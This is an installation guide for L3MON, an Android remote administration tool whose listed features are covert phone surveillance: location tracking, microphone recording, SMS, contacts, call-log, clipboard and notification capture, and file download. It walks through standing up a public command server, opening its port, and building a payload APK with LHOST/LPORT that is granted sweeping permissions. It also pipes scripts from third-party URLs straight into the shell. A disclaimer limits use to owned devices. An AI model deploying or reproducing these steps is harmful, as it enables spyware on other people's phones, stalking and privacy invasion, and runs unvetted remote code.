# L3MON — Complete Installation Guide

> **L3MON  — Android Remote Administration Tool**
> **Repo:** https://github.com/efxtv/L3MON  
> **Archived:** October 29, 2025 — Read-only / Educational preservation  
> **Stack:** Node.js + Express + Socket.IO + Java 8 / apktool

You must have a Linux lab to test this tool safely in an isolated environment. [JOIN US TO KNOW MORE](https://t.me/+egpQDeBtGk8wYWU1)

Cloud-based remote Android management suite, powered by NodeJS.

**Features:** GPS Logging · Microphone Recording · Contacts · SMS Logs / Send SMS · Call Logs · Installed Apps · Stub Permissions · Live Clipboard Logging · Live Notification Logging · WiFi Networks · File Explorer & Downloader · Command Queuing · Built-in APK Builder

---

## 0. Prerequisites

You MUST use **Java 1.8.0 / JRE 8**. Any other version will break APK building. Issues not using Java 8 will be closed without response.

Required:
- Java Runtime Environment 8 (OpenJDK 1.8 / Oracle JRE 8)
- Node.js 14.x – 18.x LTS + npm
- Git, curl, wget, openssl
- PM2 process manager
- A server / VPS / local machine with port **22533** open
- Android SDK build-tools / apktool (auto-installed via scripts below)
- 2GB RAM minimum, Ubuntu 20.04/22.04 recommended

---

## 1. Install Java 8 — OS Specific

### A. Debian / Ubuntu / Kali / Ubuntu chroot
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y wget curl git nano openssl nodejs npm openjdk-8-jdk openjdk-8-jre

# verify
java -version
# must show: openjdk version "1.8.0_xxx"

# install apktool for L3MON
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-kali-ubuntu.sh)
```

Set Java 8 as default if you have multiple versions:
```bash
sudo update-alternatives --config java
# select java-8-openjdk
```

### B. Termux (Android)
```bash
pkg update && pkg upgrade -y
pkg install -y git curl wget nodejs-lts openssl-tool nano

# L3MON Termux Java 8 workaround
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-termux.sh)
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/L3mon-no-java8.sh)

# install EMSF helper
curl -L -o $PREFIX/bin/emsf https://github.com/efxtv/EMSF/blob/main/termux/emsf?raw=true
chmod +x $PREFIX/bin/emsf
```

### C. Fedora / Oracle Linux / Red Hat / CentOS
```bash
su -c "yum install -y java-1.8.0-openjdk java-1.8.0-openjdk-devel git curl wget nodejs npm openssl"
# or dnf:
sudo dnf install -y java-1.8.0-openjdk-devel nodejs npm git

source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-kali-ubuntu.sh)
java -version
```

### D. Windows 10/11
1. Download **Oracle JRE 8** / **JDK 8u361**:  
   https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html
2. Install, then add to PATH:
   `C:\Program Files\Java\jre1.8.0_xxx\bin`
3. Verify in CMD:
   ```
   java -version
   ```
   Must show 1.8.0
4. Install Node.js LTS from: https://nodejs.org/en/download
5. Install Git for Windows: https://git-scm.com/download/win

---

## 2. Clone L3MON

```bash
git clone https://github.com/efxtv/L3MON.git
cd L3MON
```

> Original project is archived. The maintainers distributed releases via Telegram: https://t.me/+egpQDeBtGk8wYWU1

---

## 3. Install Node Dependencies + PM2

```bash
# Install PM2 globally
sudo npm install pm2 -g

# Install project dependencies
npm install

# Audit / fix (as per upstream README)
npm audit fix
npm audit
npm audit fix --force
```

If you get `node-gyp` / `sqlite` errors:
```bash
sudo apt install -y build-essential python3
npm install --build-from-source
```

---

## 4. First Run & Configure Admin Login

```bash
# start once to generate maindb.json
pm2 start index.js --name l3mon
pm2 stop l3mon
```

Edit credentials:
```bash
nano maindb.json
```

Under `admin`:
```json
"admin": {
  "username": "your_admin_username",
  "password": "5d41402abc4b2a76b9719d911017c592"
}
```

Generate MD5 password (LOWERCASE):
```bash
# Linux / macOS / Termux
echo -n "YourPasswordHere" | openssl md5 | awk '{print $2}'

# Example: efxtv
# echo -n efxtv | openssl md5
# -> 3c8e4f8e5c1c8f7e9b0a1d2c3e4f5a6b  (use your actual output, lowercase)
```

Save file, then:
```bash
pm2 restart all
# or
pm2 start index.js --name l3mon
pm2 save
pm2 startup
# run the command PM2 prints to enable autostart
```

Access dashboard:
```
http://127.0.0.1:22533
http://YOUR_SERVER_IP:22533
```

Login with the username + plain-text password you hashed.

---

## 5. Firewall / Port

L3MON default: **TCP 22533**

Ubuntu / UFW:
```bash
sudo ufw allow 22533/tcp
sudo ufw reload
```

Cloud VPS: open 22533 in your security group / firewall panel.

Reverse proxy (optional nginx):
```nginx
server {
  listen 80;
  server_name yourdomain.com;
  location / {
    proxy_pass http://127.0.0.1:22533;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
  }
}
```

---

## 6. Build Your First APK Client

1. Login to dashboard → **Build**
2. Set:
   - **LHOST:** your public server IP / domain
   - **LPORT:** 22533
   - App name / icon as needed
3. Click **Build**
4. Download APK from `clientData/` or dashboard
5. Install on your **OWN test device** → Allow all permissions:
   - Location, Microphone, SMS, Phone, Contacts, Storage, Notifications, Accessibility
6. Client appears in dashboard → Live

Build troubleshooting:
- `Java version error` → `java -version` MUST be 1.8.0
- `apktool not found` → re-run the apktool install script from Step 1
- `maindb.json missing` → run `pm2 start index.js` once, stop, then configure
- `client offline` → check port 22533 is reachable: `curl http://YOUR_IP:22533`

---

## 7. PM2 Useful Commands

```bash
pm2 logs l3mon          # live logs
pm2 monit               # monitor
pm2 stop l3mon
pm2 restart l3mon
pm2 delete l3mon
pm2 list
pm2 save
```

Update / reinstall:
```bash
pm2 stop all
git pull
npm install
pm2 restart all
```

---

## 8. Uninstall / Cleanup

```bash
pm2 stop l3mon
pm2 delete l3mon
pm2 save
cd ..
rm -rf L3MON
```

Remove Java 8 (Ubuntu):
```bash
sudo apt remove openjdk-8-*
```

---

## 9. File Structure

```
L3MON/
├── index.js              # Node server entry
├── maindb.json           # users / clients DB – EDIT FOR LOGIN
├── maindb.json.back
├── package.json
├── app/factory/          # APK build templates
├── clientData/           # built APKs output
├── includes/
├── assets/
├── error-and-install/    # GIF help guides
└── L3mon_Dockerfile
```

---

## 10. Quick One-Line Installer (Ubuntu 22.04)

```bash
sudo apt update && sudo apt install -y openjdk-8-jdk openjdk-8-jre nodejs npm git curl openssl && \
git clone https://github.com/efxtv/L3MON.git && cd L3MON && \
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-kali-ubuntu.sh) && \
sudo npm install pm2 -g && npm install && npm audit fix --force && \
pm2 start index.js --name l3mon && echo "Open http://localhost:22533"
# then stop and set your maindb.json admin MD5 password
```


## Self Help
| [![Git Clone](https://github.com/efxtv/L3MON/raw/main/error-and-install/1git-clone.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/1git-clone.gif) | [![Prerequisites](https://github.com/efxtv/L3MON/raw/main/error-and-install/2prerequisites.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/2prerequisites.gif) | [![Install L3MON](https://github.com/efxtv/L3MON/raw/main/error-and-install/3install-L3MON.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/3install-L3MON.gif) |
|---|---|---|
| [![Setup Password MD5](https://github.com/efxtv/L3MON/raw/main/error-and-install/4asetup-password-md5.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/4asetup-password-md5.gif) | [![Fix Java 8 in Termux](https://github.com/efxtv/L3MON/raw/main/error-and-install/4fix-java8-in-termux.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/4fix-java8-in-termux.gif) | [![Missing mainDB.json](https://github.com/efxtv/L3MON/raw/main/error-and-install/5amissing-maindb.json.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/5amissing-maindb.json.gif) |
| [![Build](https://github.com/efxtv/L3MON/raw/main/error-and-install/5build.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/5build.gif) | [![Build Install](https://github.com/efxtv/L3MON/raw/main/error-and-install/6build-install.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/6build-install.gif) | [![Allow Permissions](https://github.com/efxtv/L3MON/raw/main/error-and-install/7allow-permissions.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/7allow-permissions.gif) |

[![Live Client](https://github.com/efxtv/L3MON/raw/main/error-and-install/8live-client.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/8live-client.gif)
## Thanks
L3MON Builds off and utilizes several open-source software, Without these, L3MON Wouldn't be what it is!
 - Inspiration for the project and the basic building blocks for the Android App are based on [AhMyth](https://github.com/AhMyth/AhMyth-Android-RAT) 
 - [express](https://github.com/expressjs/express)
 - [node-geoip](https://github.com/bluesmoon/node-geoip)
 - [lowdb](https://github.com/typicode/lowdb)
 - [socket.io](https://github.com/socketio/socket.io)
 - [Open Street Map](https://www.openstreetmap.org)
 - [Leaflet](https://leafletjs.com/)


---

## Disclaimer

L3MON is provided strictly for educational purposes, authorized cybersecurity training, and defensive security research on devices you own or have explicit, informed, written consent to test. D3VL / efxtv provide no warranty and accept no liability for any direct or indirect damage, data loss, privacy violation, or legal consequences arising from its use. Unauthorized access, interception, surveillance, or deployment against any device without the legal owner’s prior consent is illegal under laws including the U.S. Computer Fraud and Abuse Act, UK Computer Misuse Act 1990, India IT Act 2000, EU GDPR, and equivalent statutes worldwide, and is expressly prohibited — you assume sole criminal and civil responsibility for your actions; if you do not agree, or if such tools are illegal in your jurisdiction, do not download, install, or use L3MON.

---

*Made with ❤️ by D3VL — L3MON  — Archived Oct 29, 2025 — MIT License*
*Credits: AhMyth, express, node-geoip, lowdb, socket.io, OpenStreetMap, Leaflet*
*Support / releases (archived): *
